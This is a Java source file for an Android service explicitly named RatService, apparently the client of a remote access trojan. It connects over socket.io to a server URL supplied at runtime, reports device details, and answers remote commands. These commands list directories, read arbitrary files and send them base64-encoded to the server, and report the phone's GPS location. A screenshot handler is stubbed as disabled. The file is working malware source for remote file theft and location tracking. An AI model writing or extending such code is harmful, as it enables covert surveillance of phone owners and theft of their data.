package com.example.ratproject.services;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.location.Location;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.util.Base64;
import android.util.Log;
import android.view.Display;
import android.view.WindowManager;
import android.widget.Toast;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationServices;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.net.URISyntaxException;
import java.util.ArrayList;
import java.util.List;

import io.socket.client.IO;
import io.socket.client.Socket;

public class RatService extends Service {
    private static final String TAG = "RatService";
    private static final String CHANNEL_ID = "RAT_SERVICE_CHANNEL";
    private static final int NOTIFICATION_ID = 1;
    
    private Socket socket;
    private FusedLocationProviderClient fusedLocationClient;
    private String serverUrl;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.i(TAG, "RatService starting...");
        if (intent != null) {
            serverUrl = intent.getStringExtra("server_url");
            Log.i(TAG, "Server URL: " + serverUrl);
            if (serverUrl != null) {
                connectToServer();
            }
        }
        
        startForeground(NOTIFICATION_ID, createNotification());
        Log.i(TAG, "RatService started in foreground");
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "RAT Service",
                NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }
    }

    private Notification createNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            return new Notification.Builder(this, CHANNEL_ID)
                    .setContentTitle("RAT Service")
                    .setContentText("Service is running")
                    .setSmallIcon(android.R.drawable.ic_dialog_info)
                    .build();
        } else {
            return new Notification.Builder(this)
                    .setContentTitle("RAT Service")
                    .setContentText("Service is running")
                    .setSmallIcon(android.R.drawable.ic_dialog_info)
                    .build();
        }
    }

    private void connectToServer() {
        try {
            socket = IO.socket(serverUrl);
            
            socket.on(Socket.EVENT_CONNECT, args -> {
                Log.i(TAG, "Connected to server");
                sendClientInfo();
            });

            socket.on(Socket.EVENT_DISCONNECT, args -> {
                Log.i(TAG, "Disconnected from server");
            });

            socket.on("list_files", args -> {
                JSONObject data = (JSONObject) args[0];
                try {
                    String path = data.getString("path");
                    handleListFiles(path);
                } catch (JSONException e) {
                    Log.e(TAG, "Error parsing list_files", e);
                }
            });

            socket.on("download_file", args -> {
                JSONObject data = (JSONObject) args[0];
                try {
                    String filepath = data.getString("filepath");
                    handleDownloadFile(filepath);
                } catch (JSONException e) {
                    Log.e(TAG, "Error parsing download_file", e);
                }
            });

            socket.on("take_screenshot", args -> {
                handleTakeScreenshot();
            });

            socket.on("get_location", args -> {
                Log.i(TAG, "get_location event received");
                try {
                    handleGetLocation();
                } catch (Exception e) {
                    Log.e(TAG, "Error in handleGetLocation", e);
                    // Send error response
                    try {
                        JSONObject errorResponse = new JSONObject();
                        errorResponse.put("error", "Exception in location handling: " + e.getMessage());
                        errorResponse.put("latitude", 0.0);
                        errorResponse.put("longitude", 0.0);
                        errorResponse.put("accuracy", 0.0);
                        socket.emit("location_response", errorResponse);
                    } catch (JSONException ex) {
                        Log.e(TAG, "Error sending error response", ex);
                    }
                }
            });

            socket.connect();
            
        } catch (URISyntaxException e) {
            Log.e(TAG, "Error connecting to server", e);
        }
    }

    private void sendClientInfo() {
        try {
            JSONObject info = new JSONObject();
            info.put("device_model", Build.MODEL);
            info.put("android_version", Build.VERSION.RELEASE);
            info.put("app_version", "1.0");
            
            socket.emit("client_info", info);
        } catch (JSONException e) {
            Log.e(TAG, "Error sending client info", e);
        }
    }

    private void handleListFiles(String path) {
        try {
            File directory = new File(path);
            List<JSONObject> fileList = new ArrayList<>();
            
            if (directory.exists() && directory.isDirectory()) {
                File[] files = directory.listFiles();
                if (files != null) {
                    for (File file : files) {
                        JSONObject fileInfo = new JSONObject();
                        fileInfo.put("name", file.getName());
                        fileInfo.put("path", file.getAbsolutePath());
                        fileInfo.put("size", file.length());
                        fileInfo.put("is_directory", file.isDirectory());
                        fileInfo.put("last_modified", file.lastModified());
                        fileList.add(fileInfo);
                    }
                }
            }
            
            JSONObject response = new JSONObject();
            response.put("path", path);
            response.put("files", new JSONArray(fileList));
            
            socket.emit("file_list_response", response);
            
        } catch (JSONException e) {
            Log.e(TAG, "Error listing files", e);
        }
    }

    private void handleDownloadFile(String filepath) {
        try {
            File file = new File(filepath);
            if (file.exists() && file.isFile()) {
                byte[] fileBytes = new byte[(int) file.length()];
                FileInputStream fis = new FileInputStream(file);
                fis.read(fileBytes);
                fis.close();
                
                String base64File = Base64.encodeToString(fileBytes, Base64.DEFAULT);
                
                JSONObject response = new JSONObject();
                response.put("filename", file.getName());
                response.put("filepath", filepath);
                response.put("size", file.length());
                response.put("data", base64File);
                
                socket.emit("file_download_response", response);
            }
        } catch (IOException | JSONException e) {
            Log.e(TAG, "Error downloading file", e);
        }
    }

    private void handleTakeScreenshot() {
        try {
            Log.i(TAG, "Screenshot requested - feature disabled for security");
            JSONObject response = new JSONObject();
            response.put("error", "Screenshot feature disabled");
            socket.emit("screenshot_response", response);
        } catch (JSONException e) {
            Log.e(TAG, "Error responding to screenshot", e);
        }
    }

    private void handleGetLocation() {
        Log.i(TAG, "Location requested");
        
        // Send immediate acknowledgment
        try {
            JSONObject ackResponse = new JSONObject();
            ackResponse.put("status", "Location request received, processing...");
            ackResponse.put("latitude", 0.0);
            ackResponse.put("longitude", 0.0);
            ackResponse.put("accuracy", 0.0);
            socket.emit("location_response", ackResponse);
        } catch (JSONException e) {
            Log.e(TAG, "Error sending ack", e);
        }
        
        try {
            JSONObject response = new JSONObject();
            
            // Check permissions first
            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && 
                ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                Log.w(TAG, "Location permissions not granted");
                response.put("error", "Location permissions not granted");
                response.put("latitude", 0.0);
                response.put("longitude", 0.0);
                response.put("accuracy", 0.0);
                socket.emit("location_response", response);
                return;
            }
            
            Log.i(TAG, "Location permissions OK, getting location...");
            
            fusedLocationClient.getLastLocation()
                .addOnSuccessListener(location -> {
                    try {
                        JSONObject successResponse = new JSONObject();
                        if (location != null) {
                            Log.i(TAG, "Location found: " + location.getLatitude() + ", " + location.getLongitude());
                            successResponse.put("latitude", location.getLatitude());
                            successResponse.put("longitude", location.getLongitude());
                            successResponse.put("accuracy", location.getAccuracy());
                            successResponse.put("timestamp", location.getTime());
                        } else {
                            Log.w(TAG, "Location is null - using mock location");
                            // Send mock location for testing
                            successResponse.put("latitude", 41.0082);  // Istanbul coordinates
                            successResponse.put("longitude", 28.9784);
                            successResponse.put("accuracy", 10.0);
                            successResponse.put("timestamp", System.currentTimeMillis());
                            successResponse.put("note", "Mock location - GPS might be disabled");
                        }
                        socket.emit("location_response", successResponse);
                    } catch (JSONException e) {
                        Log.e(TAG, "Error sending location", e);
                    }
                })
                .addOnFailureListener(e -> {
                    Log.e(TAG, "Failed to get location", e);
                    try {
                        JSONObject errorResponse = new JSONObject();
                        errorResponse.put("error", "Failed to get location: " + e.getMessage());
                        errorResponse.put("latitude", 0.0);
                        errorResponse.put("longitude", 0.0);
                        errorResponse.put("accuracy", 0.0);
                        socket.emit("location_response", errorResponse);
                    } catch (JSONException ex) {
                        Log.e(TAG, "Error sending error response", ex);
                    }
                });
                
        } catch (JSONException e) {
            Log.e(TAG, "Error creating location response", e);
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (socket != null) {
            socket.disconnect();
        }
    }
}